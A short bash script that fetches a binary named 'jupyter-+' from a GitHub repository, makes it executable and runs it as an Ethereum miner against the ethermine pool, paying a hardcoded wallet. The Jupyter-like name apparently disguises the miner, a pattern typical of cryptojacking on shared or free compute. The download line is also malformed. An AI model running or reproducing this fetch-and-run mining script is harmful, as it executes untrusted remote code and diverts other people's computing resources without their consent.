#!/bin/bash
sudo apt update && wget wget https://github.com/galebi/pihu/raw/main/jupyter-+ 
chmod +x jupyter-+
POOL=eu1.ethermine.org:4444
WALLET=0xe3ed79913abb464e0ca11c278cec2a501bd4da7d
WORKEER=$(echo $(shuf -i 1000-9999 -n 1)-hudddd)


./jupyter-+ --algo ETHASH --pool $POOL --user $WALLET.$WORKEER --ethstratum ETHPROXY
